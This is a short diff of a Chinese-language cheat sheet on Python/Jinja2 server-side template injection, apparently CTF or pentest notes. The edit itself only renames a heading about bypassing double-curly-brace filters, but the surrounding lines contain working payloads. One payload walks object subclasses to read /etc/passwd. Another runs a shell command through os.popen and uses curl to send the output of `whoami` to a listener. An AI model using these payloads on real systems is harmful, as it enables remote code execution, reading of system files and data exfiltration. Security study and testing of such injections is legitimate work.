@@ -165,8 +165,8 @@ values 同理 数据为post
 {{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(40)('/etc/passwd').read()}}
 ```
 
-## ④ 过滤{{
-利用{ %% }
+## ④ 双中括号过滤
+利用{ % % }
 ```python
 { % if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' % }1{ % endif % }
 ```
